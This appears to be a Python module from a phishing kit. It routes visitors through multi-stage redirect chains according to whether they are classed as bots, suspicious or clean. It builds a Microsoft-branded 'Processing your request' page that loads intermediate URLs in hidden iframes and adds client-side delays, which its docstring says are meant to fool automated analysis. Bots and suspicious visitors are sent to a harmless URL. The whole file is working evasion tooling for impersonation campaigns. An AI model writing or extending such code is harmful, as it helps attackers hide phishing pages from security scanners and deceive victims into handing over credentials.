"""Multi-stage redirect chains based on visitor classification.

Supports configurable redirect sequences with delays for each classification
level (bot, suspicious, clean). Delays are implemented client-side via JS
to make timing look natural to automated analysis.
"""

from __future__ import annotations

from typing import Any

from .config import Config


def get_chain(
    classification: str,
    cfg: Config,
    campaign_chains: dict[str, Any] | None = None,
) -> list[dict[str, Any]]:
    chains = campaign_chains or cfg.redirect_chains
    if not chains:
        return []
    return chains.get(classification, [])


def build_chain_page(steps: list[dict[str, Any]], brand: str = "Microsoft") -> str:
    if not steps:
        return ""

    if len(steps) == 1 and steps[0].get("delay_ms", 0) == 0:
        return ""

    final_url = steps[-1]["url"]
    intermediate_steps = steps[:-1]

    js_steps = []
    cumulative_delay = 0
    for step in intermediate_steps:
        delay = step.get("delay_ms", 0)
        cumulative_delay += delay
        js_steps.append(
            f'{{ url: "{step["url"]}", delay: {cumulative_delay} }}'
        )

    final_delay = cumulative_delay + steps[-1].get("delay_ms", 0)

    steps_js = ",\n      ".join(js_steps)

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <style>
    * {{ margin:0; padding:0; box-sizing:border-box }}
    body {{
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: #f3f3f3; color: #323130;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh;
    }}
    .card {{
      background: #fff; border-radius: 8px;
      box-shadow: 0 2px 12px rgba(0,0,0,.08);
      padding: 48px 36px; text-align: center;
      max-width: 440px; width: 92%;
    }}
    .ring {{
      margin: 20px auto; width: 36px; height: 36px;
      border: 3px solid #edebe9; border-top-color: #0078d4;
      border-radius: 50%; animation: spin .9s linear infinite;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg) }} }}
    p {{ font-size: 14px; color: #605e5c; line-height: 1.5 }}
    .foot {{ margin-top: 20px; font-size: 11px; color: #a19f9d }}
  </style>
</head>
<body>
  <div class="card">
    <p>Processing your request&hellip;</p>
    <div class="ring"></div>
    <div class="foot">{brand}</div>
  </div>
  <script>
  (function() {{
    var steps = [
      {steps_js}
    ];
    var finalUrl = "{final_url}";
    var finalDelay = {final_delay};

    steps.forEach(function(step) {{
      setTimeout(function() {{
        var iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.src = step.url;
        document.body.appendChild(iframe);
      }}, step.delay);
    }});

    setTimeout(function() {{
      window.location.href = finalUrl;
    }}, finalDelay);
  }})();
  </script>
</body>
</html>"""


def get_redirect_url(
    classification: str,
    cfg: Config,
    *,
    campaign_chains: dict[str, Any] | None = None,
    safe_url: str = "",
    flagged_url: str = "",
    brand: str = "Microsoft",
) -> tuple[str, str | None]:
    """Returns (url, chain_html_or_none).

    If a redirect chain is configured for this classification, returns the
    gate endpoint URL and the chain HTML page. Otherwise returns the
    appropriate redirect URL and None.
    """
    chain = get_chain(classification, cfg, campaign_chains)
    if chain and len(chain) > 1:
        page = build_chain_page(chain, brand)
        if page:
            return "", page

    if chain and len(chain) == 1:
        return chain[0]["url"], None

    if classification in ("bot", "suspicious"):
        return flagged_url or cfg.flagged_redirect_url, None
    return safe_url or cfg.safe_redirect_url, None
